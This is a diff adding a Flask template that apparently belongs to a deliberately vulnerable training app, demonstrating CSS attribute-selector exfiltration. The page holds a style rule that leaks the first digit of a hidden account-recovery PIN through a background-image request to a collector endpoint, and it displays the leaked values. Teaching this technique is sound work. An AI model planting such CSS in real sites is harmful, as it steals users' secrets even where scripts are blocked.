@@ -1,0 +1,36 @@
+{% extends "core/base.html" %}
+{% block title %}CSS Exfiltration Demo{% endblock %}
+
+{% block content %}
+<h1>CSS Attribute-Selector Exfiltration Demo</h1>
+<p class="text-muted">
+  This page simulates a victim's profile-theme preview after an attacker's
+  CSS has already been saved. The sandboxed iframe below has JavaScript
+  entirely disabled (<code>sandbox=""</code>, no <code>allow-scripts</code>
+  at all) -- proving this technique needs no script execution whatsoever,
+  which is exactly what makes it dangerous behind a Content-Security-Policy
+  that blocks JavaScript but has no equivalent restriction on CSS.
+</p>
+<iframe sandbox="" style="border:1px solid #ccc; width:100%; height:120px"
+  src="data:text/html,
+  &lt;style&gt;
+    input[name=&quot;account_recovery_pin&quot;][value^=&quot;7&quot;] {
+      background-image: url(&quot;{{ url_for('a03_injection.css_exfil_collector', leak='7', _external=True) }}&quot;);
+    }
+  &lt;/style&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;account_recovery_pin&quot; value=&quot;{{ account_recovery_pin }}&quot;&gt;
+  &lt;p&gt;Victim profile preview (attacker-controlled CSS already applied)&lt;/p&gt;
+"></iframe>
+<div class="border rounded p-2 bg-body-secondary mt-3">
+  <p class="mb-1">Exfiltrated so far (reload this page after the iframe above loads):</p>
+  {% if leaked %}
+  <ul class="mb-0">
+    {% for value in leaked %}
+    <li>{{ value }}</li>
+    {% endfor %}
+  </ul>
+  {% else %}
+  <p class="text-muted mb-0">(nothing leaked yet -- wait a moment, then reload)</p>
+  {% endif %}
+</div>
+{% endblock %}
